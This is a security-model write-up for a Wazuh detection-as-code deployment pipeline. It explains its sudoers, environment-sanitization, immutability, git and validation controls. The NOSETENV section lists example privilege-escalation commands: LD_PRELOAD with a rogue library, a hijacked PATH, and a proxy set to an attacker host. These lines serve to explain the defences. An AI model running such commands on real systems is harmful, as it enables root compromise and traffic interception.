# Wazuh Detection-as-Code: Security Model
<!-- Last updated: 2026-05-20 -->

## Navigation

[Setup Guide](setup_guide.md) | [Architecture](architecture.md) | [Troubleshooting](troubleshooting.md)

## Security Philosophy

This pipeline is designed around three core security principles. Every control in the system traces back to at least one of these principles, and understanding them helps you reason about why things are configured the way they are.

### Defense in Depth

No single control is trusted to prevent all attacks. Instead, multiple overlapping layers ensure that if one control fails, others still protect the system. For example, even if an attacker compromises the GitHub Actions runner process, they face:

- Environment sanitization (no inherited variables to exploit)
- Script immutability (cannot modify the deploy script)
- NOSETENV sudoers (cannot inject environment into the privileged execution)
- Content validation (cannot deploy empty or invalid rules)
- Auto-rollback (invalid configurations are automatically reverted)

Each layer independently limits what an attacker can achieve, so a breach of one layer does not cascade into full compromise.

### Least Privilege

Every component operates with the minimum permissions required to perform its function:

- The **ci-runner** user can only execute one specific script via sudo — nothing else
- The **GitHub Actions workflow** has `contents: read` permissions only — it cannot push code, create releases, or access secrets beyond what is explicitly granted
- The **deploy script** runs as root only because it must restart system services and modify files owned by the `wazuh` user — it accepts no arguments and no environment variables
- **File ownership** is split: root owns the script and backup directory, `wazuh` owns the production rule files, and `ci-runner` owns only the runner workspace

If any component is compromised, the blast radius is limited to what that component can access.

### Fail-Safe Defaults

When something goes wrong, the system defaults to a safe state rather than a broken one:

- If configuration validation fails → auto-rollback restores the last known-good state
- If the service fails to restart → auto-rollback and restart with previous config
- If health checks fail after restart → auto-rollback triggers
- If the repository has empty rule directories → deployment is refused entirely
- If a concurrent deployment is attempted → the second invocation exits immediately rather than corrupting state
- If environment contamination is detected → the script aborts before any changes are made

The system never leaves Wazuh in a degraded state. Either the new rules deploy successfully, or the previous working configuration is restored.

## Threat Model

The following table maps each identified threat to the control that mitigates it. Use this to understand why each security mechanism exists and what would happen if it were removed.

| Threat | Impact | Mitigation Control | Implementation |
|--------|--------|-------------------|----------------|
| Attacker injects malicious environment variables via the runner process | Arbitrary command execution or path hijacking during deployment | Environment sanitization | Script unsets all inherited env vars, sets explicit `PATH=/usr/bin:/usr/sbin`, aborts if residual variables detected |
| Attacker modifies the deploy script on disk to inject backdoor commands | Persistent root-level code execution on every deployment | Immutable script attribute | `chattr +i` prevents modification even by root; workflow pre-flight verifies immutability via `lsattr` before execution |
| Attacker escalates privileges by passing environment variables through sudo | Variable injection (e.g., `LD_PRELOAD`, `PATH`) into the root execution context | NOSETENV sudoers restriction | Sudoers rule uses `NOPASSWD:NOSETENV` — sudo strips all environment variables before invoking the script |
| Attacker manipulates git history or injects commits via a compromised pull | Supply-chain poisoning: malicious rules deployed to production | Deterministic git strategy | `git fetch` + `reset --hard origin/main` ignores local state entirely; only the remote branch HEAD is deployed |
| Two deployments run simultaneously, causing file corruption or partial state | Corrupted rules, inconsistent config, or service crash | Concurrency lock (flock) | `flock -n` on `/var/run/wazuh-deploy.lock` ensures mutual exclusion; second invocation exits immediately |
| Attacker pushes a commit that empties the rules directory to wipe detection | All detection rules removed from production Wazuh instance | Content validation | Script counts XML files in `rules/` and `decoders/`; refuses to deploy if either directory is empty |
| Attacker deploys syntactically invalid rules to crash the Wazuh analysis engine | Wazuh manager fails to start, leaving the SIEM blind | Config validation | `wazuh-analysisd -t` validates all rules before restart; failure triggers auto-rollback |
| Deployment introduces rules that pass validation but break runtime behavior | Wazuh manager starts but key daemons crash or fail to initialize | Health check with auto-rollback | Post-restart polling verifies service is active and `wazuh-analysisd`, `wazuh-remoted`, `wazuh-syscheckd` are running |
| Attacker passes arguments to the deploy script to alter its behavior | Unexpected code paths executed, potential for injection | No user input accepted | Script rejects any arguments (`$# -gt 0` check) and redirects stdin from `/dev/null` |
| Compromised workflow attempts to write to the repository or access secrets | Repository tampering, secret exfiltration, or lateral movement | Minimal workflow permissions | Workflow declares `permissions: contents: read` only; no write access, no secrets passed to the script |
| Attacker gains ci-runner access and attempts to run arbitrary commands as root | Full system compromise via unrestricted sudo | Least privilege sudoers | ci-runner can only `sudo` the single deploy script path — no other commands, no shell access |
| Failed deployment leaves Wazuh in a broken state with no detection capability | Security monitoring gap — attacks go undetected | Auto-rollback | On any failure (config test, restart, health check), backup is restored, permissions fixed, and service restarted with known-good config |

## Environment Sanitization

### What It Prevents

Environment variable injection is one of the most common privilege escalation vectors on Linux. When a process inherits environment variables from its parent, an attacker who controls the parent can influence the child's behavior in dangerous ways:

- **PATH hijacking** — setting `PATH=/tmp/evil:$PATH` causes the script to execute attacker-controlled binaries instead of system utilities
- **LD_PRELOAD injection** — loading a malicious shared library into every process the script spawns
- **Locale/encoding attacks** — manipulating `LC_ALL` or `IFS` to alter how the shell parses commands
- **Proxy redirection** — setting `http_proxy` or `https_proxy` to route git traffic through an attacker-controlled server

Since the deploy script runs as root (via sudo), any of these attacks would execute with full system privileges.

### How the Implementation Works

The script performs environment sanitization in three stages before any deployment logic runs:

**Stage 1: Redirect stdin**

```bash
exec < /dev/null
```

This prevents any external input from being piped into the script. Even if an attacker manages to invoke the script with crafted stdin, it is discarded.

**Stage 2: Unset all inherited variables**

```bash
while IFS='=' read -r var_name _; do
  unset "$var_name" 2>/dev/null || true
done < <(/usr/bin/env)
```

This iterates over every environment variable reported by `/usr/bin/env` and unsets it. The `2>/dev/null || true` ensures the script does not abort if a read-only variable cannot be unset.

**Stage 3: Set explicit PATH and verify**

```bash
PATH=/usr/bin:/usr/sbin
```

After clearing the environment, the script sets a known-safe PATH containing only system binary directories. It then runs a verification loop:

```bash
while IFS='=' read -r var_name _; do
  case "$var_name" in
    PATH|BASHOPTS|BASH_VERSINFO|BASH_VERSION|SHELLOPTS|UID|EUID|PPID|IFS|PWD|OLDPWD|_|TERM|SHLVL|BASH|SHELL)
      ;;
    *)
      /usr/bin/logger -t "$LOG_TAG" -p auth.alert "event=precondition_failed reason=env_contamination var=$var_name"
      exit 1
      ;;
  esac
done < <(/usr/bin/env)
```

Only bash built-in variables (which cannot be unset) are allowed to remain. If any unexpected variable survives the sanitization, the script logs an `auth.alert` and aborts immediately. This catches edge cases where a variable might be marked read-only or re-injected by the shell.

### Why This Matters

Even with `NOSETENV` in the sudoers configuration (which strips environment variables passed through sudo), the sanitization provides an independent layer of protection. If the sudoers configuration were ever misconfigured, or if the script were invoked through a different mechanism, the sanitization still prevents environment-based attacks.

---

## Immutable Script Attribute (chattr +i)

### Why It Exists

The deploy script runs as root and has the power to modify production Wazuh configuration, restart services, and access backup files. If an attacker could modify the script's contents on disk, they would gain persistent root-level code execution on every subsequent deployment — a powerful backdoor that survives reboots and is triggered automatically by normal workflow activity.

The Linux immutable file attribute (`chattr +i`) prevents any modification, deletion, or renaming of the file — even by root — until the attribute is explicitly removed. This makes the script tamper-proof against:

- An attacker who gains write access to `/usr/local/bin/`
- A compromised process running as root that attempts to overwrite the script
- Accidental modification by an administrator

### What It Prevents

| Attack | Without chattr +i | With chattr +i |
|--------|-------------------|----------------|
| Overwrite script with backdoor | Succeeds silently | `Operation not permitted` |
| Append malicious commands | Succeeds silently | `Operation not permitted` |
| Delete and replace script | Succeeds silently | `Operation not permitted` |
| Rename script and place fake | Succeeds silently | `Operation not permitted` |

### Workflow Verification

The GitHub Actions workflow includes a pre-flight check that verifies the immutable attribute before executing the script:

**On the Wazuh server, as ci-runner:**

```bash
attr=$(lsattr /usr/local/bin/wazuh-deploy.sh | cut -c5)
if [ "$attr" != "i" ]; then
  echo "::error::Deploy script immutable attribute not set. Aborting."
  exit 1
fi
```

If the attribute has been removed (indicating tampering or an incomplete update procedure), the deployment is refused and an alert is logged.

### Safe Update Procedure

When you need to update the deploy script, follow this exact sequence:

**On the Wazuh server, as root:**

```bash
# 1. Remove the immutable attribute
chattr -i /usr/local/bin/wazuh-deploy.sh

# 2. Install the updated script
cp /opt/wazuh-dac/scripts/wazuh_deploy.sh /usr/local/bin/wazuh-deploy.sh

# 3. Restore ownership and permissions
chown root:root /usr/local/bin/wazuh-deploy.sh
chmod 755 /usr/local/bin/wazuh-deploy.sh

# 4. Re-apply the immutable attribute
chattr +i /usr/local/bin/wazuh-deploy.sh
```

**Verify the attribute is set:**

```bash
lsattr /usr/local/bin/wazuh-deploy.sh
```

**Expected output:**

```
----i---------e-- /usr/local/bin/wazuh-deploy.sh
```

> ⚠️ **Pitfall:** If you forget to re-apply `chattr +i` after updating, the next deployment will fail the pre-flight immutability check. Always verify with `lsattr` after any script update.

---

## Sudoers Configuration (NOPASSWD:NOSETENV)

### The Sudoers Rule

The ci-runner user is granted exactly one sudo privilege:

```
ci-runner ALL=(root) NOPASSWD:NOSETENV: /usr/local/bin/wazuh-deploy.sh
```

This rule has four components, each serving a specific security purpose:

| Component | Meaning | Security Purpose |
|-----------|---------|-----------------|
| `ci-runner` | Only this user can use this rule | Limits who can trigger deployments |
| `ALL=(root)` | Can run the command as root | Required for service restart and file ownership changes |
| `NOPASSWD` | No password prompt required | Enables automated execution from GitHub Actions |
| `NOSETENV` | Environment variables are NOT preserved | Prevents environment injection into the root context |

### Why NOSETENV Is Critical

Without `NOSETENV`, an attacker who compromises the ci-runner user could run:

```bash
sudo LD_PRELOAD=/tmp/evil.so /usr/local/bin/wazuh-deploy.sh
sudo PATH=/tmp/evil:$PATH /usr/local/bin/wazuh-deploy.sh
sudo HTTP_PROXY=http://attacker.com /usr/local/bin/wazuh-deploy.sh
```

Even though the deploy script performs its own environment sanitization, `LD_PRELOAD` is processed by the dynamic linker *before* the script's bash interpreter starts. This means a malicious shared library would be loaded into the process before any sanitization code runs.

`NOSETENV` instructs sudo to strip all user-supplied environment variables before executing the target command. This provides a hard boundary at the sudo layer — the script starts with a clean environment regardless of what the caller attempted to inject.

### Privilege Escalation Prevention

The sudoers rule is deliberately narrow:

- **Single command only** — ci-runner cannot run `sudo bash`, `sudo su`, or any other command as root
- **Full path required** — the rule specifies `/usr/local/bin/wazuh-deploy.sh` exactly; no wildcards, no directory traversal
- **No arguments allowed** — the deploy script itself rejects any arguments (`$# -gt 0` check), so even if sudo allowed them, the script would abort
- **No shell escape** — since the script uses `set -euo pipefail` and never invokes an interactive shell, there is no opportunity for shell escape

If an attacker compromises ci-runner, they can trigger a deployment (which only deploys whatever is on `origin/main`), but they cannot execute arbitrary commands as root.

---

## Deterministic Git Strategy (fetch + reset --hard)

### Why git pull Is Avoided

The standard `git pull` command is a combination of `git fetch` + `git merge`. This introduces several risks in an automated deployment context:

1. **Merge conflicts** — if local state has diverged (even accidentally), `git pull` may fail or produce a merge commit, leaving the repository in an unexpected state
2. **Merge commit injection** — an attacker who can influence local repository state could craft a scenario where `git pull` merges attacker-controlled content
3. **Non-deterministic outcome** — the result of `git pull` depends on the current local state, making deployments unpredictable
4. **Fast-forward assumptions** — `git pull --ff-only` is safer but still depends on local state being a direct ancestor of the remote

### How fetch + reset --hard Works

The deploy script uses a two-step approach that ignores local state entirely:

**On the Wazuh server, as root (within the deploy script):**

```bash
git fetch origin main
git reset --hard origin/main
```

- `git fetch origin main` downloads the latest state of the `main` branch from GitHub without modifying the working tree
- `git reset --hard origin/main` forces the local repository to exactly match the remote branch HEAD, discarding any local modifications

This means:

- The deployed state is always exactly what is on `origin/main` — nothing more, nothing less
- Local tampering (modified files, extra commits, dirty working tree) is overwritten
- There is no merge logic, no conflict resolution, no ambiguity
- The outcome is deterministic regardless of the repository's prior local state

### Supply-Chain Risk Mitigation

This strategy mitigates several supply-chain attack vectors:

| Attack Vector | How fetch+reset Mitigates |
|---------------|--------------------------|
| Attacker adds local commits to the repo on disk | `reset --hard` overwrites them — only remote state is deployed |
| Attacker modifies tracked files without committing | `reset --hard` restores all files to match the remote |
| Attacker creates a merge conflict to stall deployments | No merge is attempted — fetch+reset always succeeds |
| Attacker manipulates git hooks in the local repo | Hooks are not triggered by `fetch` or `reset --hard` |

Combined with the content validation (empty directory check) and config validation (`wazuh-analysisd -t`), this ensures that only reviewed, merged code from the protected `main` branch reaches production.

---

## Principle of Least Privilege

The pipeline applies least privilege at every layer, ensuring each component has only the access it needs and nothing more.

### The ci-runner User

The `ci-runner` user is a dedicated service account for the GitHub Actions self-hosted runner. It is deliberately unprivileged:

- **No shell login** — the account exists solely to run the Actions runner process
- **No group memberships** beyond its own group — cannot access files owned by `wazuh`, `root`, or other service accounts
- **Single sudo privilege** — can only execute `/usr/local/bin/wazuh-deploy.sh` as root (see [Sudoers Configuration](#sudoers-configuration-nopasswdnosetenv))
- **Owns only the runner workspace** — `/home/ci-runner/actions-runner/` and its contents

If an attacker compromises the runner process, they gain ci-runner privileges only. They cannot read Wazuh configuration, modify the deploy script, access backups, or run arbitrary commands as root.

### Workflow Permissions

The GitHub Actions workflow declares minimal permissions:

```yaml
permissions:
  contents: read
```

This means the workflow token (`GITHUB_TOKEN`) can:

- ✅ Clone and read repository contents
- ❌ Push commits or create branches
- ❌ Create or modify releases
- ❌ Access repository secrets beyond those explicitly referenced
- ❌ Modify workflow files or repository settings
- ❌ Access other repositories

Even if an attacker gains access to the workflow execution environment, the token cannot be used to tamper with the repository, exfiltrate secrets, or pivot to other resources.

### File Ownership Model

File ownership on the Wazuh server follows a strict separation of concerns:

| Path | Owner | Group | Permissions | Rationale |
|------|-------|-------|-------------|-----------|
| `/usr/local/bin/wazuh-deploy.sh` | root | root | 755 + immutable | Only root can modify; everyone can execute (but sudo is still required for the script to function) |
| `/opt/wazuh-dac/` | root | root | 755 | Repository clone owned by root; deploy script (running as root) manages git operations |
| `/var/ossec/etc/rules/` | wazuh | wazuh | 750 (dirs), 640 (files) | Wazuh manager reads these; only the deploy script (as root) can write |
| `/var/ossec/etc/decoders/` | wazuh | wazuh | 750 (dirs), 640 (files) | Same as rules — owned by the service that reads them |
| `/var/ossec/actions-backups/` | root | root | 750 | Backups are sensitive (contain previous configs); only root can access |
| `/home/ci-runner/actions-runner/` | ci-runner | ci-runner | 750 | Runner workspace; isolated from all other components |

This ownership model ensures:

- The **ci-runner** cannot directly read or modify production rules, backups, or the deploy script
- The **wazuh** service account cannot modify its own rules (preventing a compromised Wazuh process from altering detection logic)
- **Root** access is required to bridge the gap between the repository and production — and that access is mediated exclusively through the hardened deploy script

---

## Concurrency Protection

### The Problem

If two deployments run simultaneously (for example, two rapid pushes to `main`), they could interfere with each other:

- Both read the same backup state, then one overwrites the other's backup
- One deployment syncs files while the other is mid-validation, causing `wazuh-analysisd -t` to test a partially-written configuration
- Both attempt to restart the service simultaneously, causing unpredictable behavior
- A rollback in one deployment could restore state that the other deployment has already overwritten

### How flock Prevents This

The deploy script uses a file lock to ensure mutual exclusion:

**On the Wazuh server, as root (within the deploy script):**

```bash
exec 9>"/var/run/wazuh-deploy.lock"
if ! /usr/bin/flock -n 9; then
  log_entry "event=precondition_failed reason=concurrent_execution"
  exit 1
fi
```

This works as follows:

1. **Open a lock file** — file descriptor 9 is opened on `/var/run/wazuh-deploy.lock`
2. **Attempt a non-blocking lock** — `flock -n` tries to acquire an exclusive lock without waiting
3. **If the lock is held** — another deployment is in progress; the script logs the event and exits immediately with a non-zero status
4. **If the lock is acquired** — the script proceeds; the lock is automatically released when the script exits (the file descriptor is closed)

The `-n` (non-blocking) flag is deliberate: rather than queuing deployments (which could deploy stale code), the second invocation fails fast. The next push to `main` will trigger a fresh deployment with the latest state.

### Why This Is Safe

- The lock is **advisory** but effective because all deployments go through the same script
- The lock is **automatically released** on script exit (including crashes), so a failed deployment cannot permanently block future deployments
- The lock file persists in `/var/run/` (a tmpfs on most systems), so it is cleaned up on reboot
- The GitHub Actions workflow will report the failure, and the next push will trigger a successful deployment

---

## Content Validation

### The Problem

An attacker (or an accidental misconfiguration) could push a commit that empties the `rules/` or `decoders/` directory. Without validation, the deploy script would faithfully sync empty directories to production, effectively wiping all detection rules from the Wazuh manager. The SIEM would continue running but would be blind — no alerts would fire regardless of what happens on monitored systems.

Similarly, syntactically invalid XML in rule files could crash the Wazuh analysis engine, taking the entire SIEM offline.

### Empty Directory Check

Before performing any destructive sync operations, the script counts XML files in both directories:

**On the Wazuh server, as root (within the deploy script):**

```bash
decoder_count=$(/usr/bin/find "$REPO_DIR/decoders" -name '*.xml' -type f | /usr/bin/wc -l)
rule_count=$(/usr/bin/find "$REPO_DIR/rules" -name '*.xml' -type f | /usr/bin/wc -l)
if [ "$decoder_count" -eq 0 ] || [ "$rule_count" -eq 0 ]; then
  log_entry "event=precondition_failed reason=empty_repo_content commit=$COMMIT_SHA decoders=$decoder_count rules=$rule_count"
  exit 1
fi
```

If either directory contains zero XML files after the git fetch, the deployment is refused. This catches:

- Accidental deletion of all rule files in a commit
- A malicious commit that removes detection coverage
- Repository corruption that results in missing files

### Configuration Validation (wazuh-analysisd -t)

After syncing files to production but before restarting the service, the script runs the Wazuh analysis engine in test mode:

**On the Wazuh server, as root (within the deploy script):**

```bash
/var/ossec/bin/wazuh-analysisd -t
```

This command:

- Parses all rule and decoder XML files
- Validates syntax and structure
- Checks for duplicate rule IDs and invalid references
- Returns exit code 0 on success, non-zero on failure

If validation fails, the script performs an automatic rollback — restoring the previous rules and decoders from the backup archive — before the service is ever restarted. This means invalid rules never reach a running Wazuh instance.

### Why Both Checks Are Needed

| Check | What It Catches | What It Misses |
|-------|----------------|----------------|
| Empty directory check | Complete removal of rules/decoders | Invalid content in existing files |
| wazuh-analysisd -t | Syntax errors, invalid XML, broken references | Files that are valid XML but semantically wrong |

Together, they form a two-layer validation gate: the first prevents catastrophic data loss, and the second prevents configuration corruption. Both must pass before the Wazuh service is restarted with new rules.
